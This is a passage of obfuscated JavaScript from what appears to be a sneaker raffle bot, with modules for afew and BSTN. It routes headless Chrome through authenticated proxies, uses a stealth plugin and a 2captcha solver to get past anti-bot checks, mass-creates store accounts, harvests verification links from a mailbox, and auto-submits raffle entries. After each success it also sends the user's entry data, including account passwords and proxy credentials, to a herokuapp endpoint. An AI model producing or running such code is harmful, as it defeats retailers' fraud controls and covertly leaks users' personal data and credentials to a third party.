                            'args': [
                                '--proxy-server=' + _0x10c939[0x0] + ':' + _0x10c939[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x30ea8b = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x10c939[0x0] + ':' + _0x10c939[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x60671d = JSON['parse'](_0x467c3c['readFileSync']('sizes.json', 'utf-8')), _0x18df0f = _0x3d2e5f[_0x5017df]['Url'], _0x1d79d0 = _0x3d2e5f[_0x5017df]['Size'], _0x8099d2;
                        async function _0x46302b() {
                            var _0xdc46c0 = new _0x199838['CookieJar']();
                            console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x5bcbf8;
                            let _0x37b905 = {
                                'method': 'GET',
                                'cookieJar': _0xdc46c0,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x10c939[0x2] + ':' + _0x10c939[0x3] + '@' + _0x10c939[0x0] + ':' + _0x10c939[0x1]
                            }, _0xd58586 = _0x18df0f['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x484f0d = _0xd58586 + '.json', _0x11cfd5 = await _0x3036f9(_0x484f0d);
                            console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x12018a = _0x11cfd5['data']['product']['variants'];
                            if (_0x1d79d0 != 'RANDOM') {
                                if (_0x12018a[0x1]['option1']['includes']('W')) {
                                    const _0x551140 = _0x60671d['women']['find'](_0x5a1269 => _0x5a1269['EUsize'] === _0x1d79d0);
                                    _0x551140 && (_0x1d79d0 = _0x551140['size']);
                                } else {
                                    if (_0x12018a[0x1]['option1']['includes']('Y')) {
                                        const _0x4cefa2 = _0x60671d['GS']['find'](_0x3b295f => _0x3b295f['EUsize'] === _0x1d79d0);
                                        _0x4cefa2 && (_0x1d79d0 = _0x4cefa2['size']);
                                    } else {
                                        const _0x57cd3b = _0x60671d['men']['find'](_0x4deb57 => _0x4deb57['EUsize'] === _0x1d79d0);
                                        _0x57cd3b && (_0x1d79d0 = _0x57cd3b['size']);
                                    }
                                }
                                for (var _0x11e0d1 of _0x12018a) {
                                    _0x11e0d1['option1'] == _0x1d79d0 && (_0x5bcbf8 = _0x11e0d1['id']);
                                }
                            } else {
                                var _0x2be107 = Math['round'](Math['random']() * (_0x12018a['length'] - 0x1));
                                _0x5bcbf8 = _0x12018a[_0x2be107]['id'];
                            }
                            console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x3036f9('https://raffles.afew-store.com/cart/' + _0x5bcbf8 + ':1'), _0x8099d2 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x46302b();
                        } catch (_0x17d3cc) {
                            if (_0x17d3cc['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x17d3cc);
                        }
                        const _0x5dac71 = await _0x30ea8b['newPage']();
                        await _0x5dac71['setDefaultNavigationTimeout'](0x1d4c0), await _0x5dac71['authenticate']({
                            'username': '' + _0x10c939[0x2],
                            'password': '' + _0x10c939[0x3]
                        }), await _0x5dac71['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5dac71['setRequestInterception'](!![]), _0x5dac71['on']('request', _0x397b37 => {
                            _0x397b37['resourceType']() === 'image' || _0x397b37['resourceType']() === 'font' || _0x397b37['resourceType']() === 'media' ? _0x397b37['abort']() : _0x397b37['continue']();
                        });
                        try {
                            await _0x5dac71['goto'](_0x8099d2, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x5dac71['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5dac71['type']('#checkout_email', '' + _0x3d2e5f[_0x5017df]['Email']), await _0x101cd5(0x320), await _0x5dac71['type']('#checkout_attributes_instagram', '' + _0x3d2e5f[_0x5017df]['Follower']), await _0x101cd5(0x320), await _0x5dac71['select']('#checkout_shipping_address_country', '' + _0x3d2e5f[_0x5017df]['Country']), await _0x5dac71['waitForTimeout'](0x258), await _0x5dac71['type']('#checkout_shipping_address_first_name', '' + _0x3d2e5f[_0x5017df]['FirstName']), await _0x5dac71['waitForTimeout'](0x320), await _0x5dac71['type']('#checkout_shipping_address_last_name', '' + _0x3d2e5f[_0x5017df]['LastName']), await _0x5dac71['waitForTimeout'](0x2bc), await _0x5dac71['type']('#checkout_shipping_address_address1', _0x3d2e5f[_0x5017df]['Address1'] + '\x20' + _0x3d2e5f[_0x5017df]['HouseNumber']), await _0x5dac71['waitForTimeout'](0x2bc), await _0x5dac71['type']('#checkout_shipping_address_address2', '' + _0x3d2e5f[_0x5017df]['Address2']), await _0x5dac71['waitForTimeout'](0x2bc), await _0x5dac71['type']('#checkout_shipping_address_zip', '' + _0x3d2e5f[_0x5017df]['Zip']), await _0x5dac71['waitForTimeout'](0x2bc), await _0x5dac71['type']('#checkout_shipping_address_city', '' + _0x3d2e5f[_0x5017df]['City']), await _0x5dac71['waitForTimeout'](0x2bc);
                        if (_0x3d2e5f[_0x5017df]['State'] != '')
                            try {
                                const _0xac3630 = JSON['parse'](_0x467c3c['readFileSync']('States.json', 'utf8'));
                                await _0x101cd5(0x1f4);
                                if (_0x3d2e5f[_0x5017df]['State']['length'] > 0x2)
                                    for (let _0x30c7ea of _0xac3630) {
                                        if (_0x30c7ea['Province'] == _0x3d2e5f[_0x5017df]['State']) {
                                            await _0x5dac71['select']('#checkout_shipping_address_province', _0x30c7ea['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x5dac71['select']('#checkout_shipping_address_province', _0x3d2e5f[_0x5017df]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x101cd5(0x190), _0x5dac71['evaluate'](() => {
                            const _0x592f1f = document['querySelector']('#continue_button');
                            for (var _0x11ea17 = 0x0; _0x11ea17 < 0x5; _0x11ea17++) {
                                if (_0x592f1f) {
                                    _0x592f1f['click'](), _0x592f1f['click']();
                                    break;
                                } else
                                    _0x101cd5(0xfa0);
                            }
                        }), await _0x5dac71['waitForTimeout'](0x9c4);
                        try {
                            await _0x5dac71['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x5dac71['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x388339 => _0x388339['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5dac71['waitForTimeout'](0x7d0), console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x5dac71['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x101cd5(0x3e8), await _0x5dac71['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x2d36ab => _0x2d36ab['submit']()), await _0x101cd5(0x3e8);
                        try {
                            await _0x5dac71['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5dac71['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x18dc2a => _0x18dc2a['submit']());
                        try {
                            await _0x5dac71['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x21d7b6 = 'no', _0x30fd17(_0x3d2e5f[_0x5017df], _0x40e4d9), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                try {
                                    await _0x3b1b09(_0x5b5c1b['webhook'], _0x35b4c6['succesDEVMSG']);
                                } catch {
                                }
                            await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x35b4c6['succesDEVMSG']), await _0x101cd5(0xc8);
                            try {
                                await _0x3b1b09(_0x155517, _0x35b4c6['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0x40e4d9['name'],
                                    'entrydata': JSON['stringify'](_0x5a7ada),
                                    'proxy': '' + _0x5cfc05[_0x5017df]
                                };
                                var _0x6697f6 = JSON['stringify'](prxdata);
                                let _0x50f34e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x6697f6, _0x50f34e);
                            } catch (_0x280b18) {
                            }
                        } catch (_0x304d69) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x402e77) {
                        _0x402e77['message']['includes']('selector') && (_0x402e77 = 'Connection\x20Error');
                        console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20' + _0x402e77)), _0x486063 = '' + _0x402e77;
                        var _0x1795c4 = await _0x42c912(_0x3d2e5f[_0x5017df], _0x40e4d9, 'dev', !![], _0x486063);
                        _0x35b4c6['errorDEV'] = { 'embeds': [_0x1795c4] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x35b4c6['errorDEV']), await _0x3b1b09(_0x57f30c, _0x35b4c6['errorDEV']), _0x21d7b6 = 'yes';
                    } finally {
                        _0x30ea8b && _0x30ea8b['close']();
                        if (_0x21d7b6 == 'yes' && _0x2a445f != 0x5 && _0x486063 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Retrying\x20(' + _0x2a445f + '\x20/\x205)')), _0x5017df = _0x5017df - 0x1, _0x2a445f = _0x2a445f + 0x1;
                            continue;
                        }
                        _0x21d7b6 == 'yes' && _0x2a445f >= 0x5 && (_0x3802e1(_0x3d2e5f[_0x5017df], _0x40e4d9), _0x21d7b6 = 'no', _0x2a445f = 0x0);
                        if (_0x5017df + 0x1 == _0x3d2e5f['length']) {
                            await _0x101cd5(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5b5c1b['AfewDelay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xe3e4a7, _0x5f40cb, _0x59cdfe) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x40d823 = 0x0; _0x40d823 < _0x5f40cb['length']; _0x40d823++) {
                        if (_0x87cf66 != 'yes')
                            var _0x87cf66 = '', _0x1b5655 = 0x0;
                        var _0x12d6a5;
                        try {
                            await _0x15925d(_0x5f40cb, _0x40d823);
                        } catch {
                            _0x87cf66 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x18a4ea(_0xe3e4a7['name'] + '\x20Task\x20' + (_0x40d823 + 0x1) + '\x20/\x20' + _0x5f40cb['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x1b5fff = await _0x42c912(_0x5f40cb[_0x40d823], _0xe3e4a7, 'acc', ![]);
                        const _0xde7de1 = { 'succesDEVMSG': { 'embeds': [_0x1b5fff] } }, _0x4e7ecd = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x25da41 = Math['round'](Math['random']() * (_0x59cdfe['length'] - 0x1)), _0x3eff1c = _0x59cdfe[_0x25da41]['split'](':'), _0x14af0f;
                        try {
                            _0x14af0f = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3eff1c[0x0] + ':' + _0x3eff1c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x14af0f = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3eff1c[0x0] + ':' + _0x3eff1c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x216135 = await _0x14af0f['newPage']();
                            await _0x216135['authenticate']({
                                'username': '' + _0x3eff1c[0x2],
                                'password': '' + _0x3eff1c[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x216135['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x216135['setRequestInterception'](!![]), _0x216135['on']('request', _0x4b4329 => {
                                _0x4b4329['resourceType']() === 'image' ? _0x4b4329['abort']() : _0x4b4329['continue']();
                            });
                            try {
                                await _0x216135['goto']('' + _0x4e7ecd), await _0x216135['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x87cf66 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x216135['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x101cd5(0x7d0), console['log'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x101cd5(0x190), await _0x216135['waitForSelector']('#firstname'), await _0x216135['type']('#firstname', _0x5f40cb[_0x40d823]['FirstName'], { 'delay': 0xf0 }), await _0x101cd5(0x190), await _0x216135['type']('#lastname', _0x5f40cb[_0x40d823]['LastName'], { 'delay': 0xe6 }), await _0x101cd5(0x190), await _0x216135['type']('#email_address', _0x5f40cb[_0x40d823]['Email'], { 'delay': 0x122 }), await _0x101cd5(0x190), await _0x216135['type']('#password', _0x5f40cb[_0x40d823]['Password'], { 'delay': 0x82 }), await _0x101cd5(0x1f4), await _0x216135['type']('#password-confirmation', _0x5f40cb[_0x40d823]['Password'], { 'delay': 0x7c }), console['log'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x101cd5(0x2bc), await _0x216135['$eval']('#form-validate', _0x264521 => _0x264521['submit']()), await _0x101cd5(0x1388);
                            const _0xf1d94a = await _0x216135['$']('#email_address-error');
                            if (_0xf1d94a)
                                throw new Error('Invalid\x20Email');
                            const _0xa81c6d = await _0x216135['$']('#password-error');
                            if (_0xa81c6d)
                                throw new Error('Invalid\x20Password');
                            await _0x216135['waitForSelector']('div.mesg-success'), _0x87cf66 = 'no', console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Account\x20' + _0x5f40cb[_0x40d823]['Email'] + '\x20Generated')), _0x467c3c['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5f40cb[_0x40d823]['Email'] + ',' + _0x5f40cb[_0x40d823]['Password']);
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0xde7de1['succesDEVMSG']);
                            } catch {
                            }
                            await _0x3b1b09(_0x2caac5, _0xde7de1['succesDEVMSG']);
                            let _0x3d6f5c = _0x5f40cb[_0x40d823];
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0xe3e4a7['name'],
                                    'entrydata': JSON['stringify'](_0x3d6f5c),
                                    'proxy': '' + _0x59cdfe[_0x40d823]
                                };
                                var _0x519092 = JSON['stringify'](prxdata);
                                let _0x1b8c18 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x519092, _0x1b8c18);
                            } catch (_0x1421e0) {
                            }
                            console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x389f4c) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20' + _0x389f4c)), _0x12d6a5 = '' + _0x389f4c;
                            var _0x43bf07 = await _0x42c912(_0x5f40cb[_0x40d823], _0xe3e4a7, 'acc', !![], _0x12d6a5);
                            _0xde7de1['errorDEV'] = { 'embeds': [_0x43bf07] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0xde7de1['errorDEV']), await _0x3b1b09(_0x57f30c, _0xde7de1['errorDEV']), _0x87cf66 = 'yes';
                        } finally {
                            if (_0x14af0f)
                                _0x14af0f['close']();
                            if (_0x87cf66 == 'yes' && _0x1b5655 != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Task\x20' + (_0x40d823 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b5655 + '\x20/\x205)')), _0x40d823 = _0x40d823 - 0x1, _0x1b5655 = _0x1b5655 + 0x1;
                                continue;
                            }
                            _0x87cf66 == 'yes' && _0x1b5655 >= 0x5 && (_0x3802e1(_0x5f40cb[_0x40d823], _0xe3e4a7), _0x87cf66 = 'no', _0x1b5655 = 0x0), console['log'](_0x235b96() + '\x20[' + _0xe3e4a7['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1de8ae, _0xdb5dd2) {
                    var _0x40fb4a = ![], _0x5b1c75 = [];
                    async function _0x71c310() {
                        var _0x25423d = new _0x3a8843({
                            'user': _0x5b5c1b['masterMail'],
                            'password': _0x5b5c1b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x12b28d(_0x1d2cc6) {
                            _0x25423d['openBox']('INBOX', ![], _0x1d2cc6);
                        }
                        _0x25423d['once']('ready', function () {
                            _0x12b28d(function (_0x41a252, _0x55275d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x41a252)
                                    throw _0x41a252;
                                _0x25423d['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x215037, _0x2b74ee) {
                                    if (!_0x2b74ee || !_0x2b74ee['length'])
                                        console['log'](_0x235b96() + '\x20[' + _0x1de8ae['name'] + ']\x20No\x20mails\x20found'), _0x25423d['end']();
                                    else {
                                        var _0x28fd28 = _0x25423d['seq']['fetch'](_0x2b74ee, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x28fd28['on']('message', function (_0x3c06f7, _0x177ac7) {
                                            var _0x3a8116 = '(#' + _0x177ac7 + ')\x20';
                                            _0x3c06f7['on']('body', function (_0x10ecfb, _0x3b0626) {
                                                _0xbb5a33(_0x10ecfb, (_0x4399f4, _0x2ace0d) => {
                                                    var _0x5ac0bb = _0x2ace0d['text']['split']('[')[0x2], _0x5545c = _0x5ac0bb['split'](']')[0x0];
                                                    _0x5b1c75['push'](_0x5545c);
                                                });
                                            }), _0x3c06f7['once']('end', function () {
                                            });
                                        }), _0x28fd28['once']('error', function (_0x975ef0) {
                                            console['log']('Fetch\x20error:\x20' + _0x975ef0), _0x40fb4a = !![];
                                        }), _0x28fd28['once']('end', function () {
                                            _0x25423d['end'](), _0x40fb4a = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x25423d['once']('error', function (_0x35b3d8) {
                            console['log'](_0x1ee8dd['red'](_0x35b3d8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x40fb4a = !![];
                        }), _0x25423d['once']('end', async function () {
                            _0x40fb4a = !![];
                        }), _0x25423d['connect']();
                    }
                    async function _0x462ca7(_0xb60997, _0x5f5bc9, _0x3ec6ef) {
                        _0x23c50c['use'](_0x9505fd());
                        for (var _0x5ec7c4 = 0x0; _0x5ec7c4 < _0x5f5bc9['length']; _0x5ec7c4++) {
                            if (_0x157c07 != 'yes')
                                var _0x157c07 = '', _0x50418b = 0x0;
                            var _0x313ab1 = Math['round'](Math['random']() * (_0x3ec6ef['length'] - 0x1)), _0x5b385e = _0x3ec6ef[_0x313ab1]['split'](':'), _0x3802f2;
                            try {
                                _0x3802f2 = await _0x23c50c['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5b385e[0x0] + ':' + _0x5b385e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3802f2 = await _0x23c50c['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x5b385e[0x0] + ':' + _0x5b385e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5c79ba = await _0x3802f2['newPage']();
                                await _0x5c79ba['authenticate']({
                                    'username': '' + _0x5b385e[0x2],
                                    'password': '' + _0x5b385e[0x3]
                                }), console['log'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x5c79ba['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5c79ba['setRequestInterception'](!![]), _0x5c79ba['on']('request', _0x43821a => {
                                    _0x43821a['resourceType']() === 'image' || _0x43821a['resourceType']() === 'font' || _0x43821a['resourceType']() === 'media' ? _0x43821a['abort']() : _0x43821a['continue']();
                                }), console['log'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x5c79ba['goto'](_0x5f5bc9[_0x5ec7c4]);
                                } catch {
                                    _0x157c07 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5c79ba['waitForTimeout'](0xbb8);
                                try {
                                    await _0x5c79ba['waitForSelector']('.account-nav'), _0x157c07 = 'no', console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x3caa65 = await _0x42c912(null, _0xb60997, 'ver', ![]);
                                    const _0x11b28d = { 'succesDEVMSG': { 'embeds': [_0x3caa65] } };
                                    await _0x3b1b09(_0x52401a, _0x11b28d['succesDEVMSG']);
                                } catch {
                                    _0x157c07 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x17078b) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20' + _0x17078b));
                                var _0x53c554 = _0x17078b, _0x224f55 = await _0x42c912(null, _0xb60997, 'ver', !![], _0x53c554);
                                const _0x262c73 = { 'errorDEVMSG': { 'embeds': [_0x224f55] } };
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x262c73['errorDEVMSG']), await _0x3b1b09(_0x57f30c, _0x262c73['errorDEVMSG']);
                            } finally {
                                _0x3802f2['close']();
                                if (_0x157c07 == 'yes' && _0x50418b != 0x5) {
                                    console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Task\x20' + (_0x5ec7c4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x50418b + '\x20/\x205)')), _0x5ec7c4 = _0x5ec7c4 - 0x1, _0x50418b = _0x50418b + 0x1;
                                    continue;
                                }
                                _0x157c07 == 'yes' && _0x50418b >= 0x5 && (_0x157c07 = 'no', _0x50418b = 0x0), console['log'](_0x235b96() + '\x20[' + _0xb60997['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                            }
                        }
                    }
                    try {
                        _0x71c310();
                        while (!_0x40fb4a) {
                            await _0x101cd5(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5b1c75['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x101cd5(0x7d0);
                    }
                    await _0x462ca7(_0x1de8ae, _0x5b1c75, _0xdb5dd2);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x272cd3, _0x3c1be2, _0x5a72f8) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5c9f45 = 0x0; _0x5c9f45 < _0x3c1be2['length']; _0x5c9f45++) {
                        var _0x52c05c, _0x3fb087 = _0x3c1be2[_0x5c9f45];
                        try {
                            await _0x15925d(_0x3c1be2, _0x5c9f45);
                        } catch {
                            _0x3eb69c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x38548c(_0x490e82) {
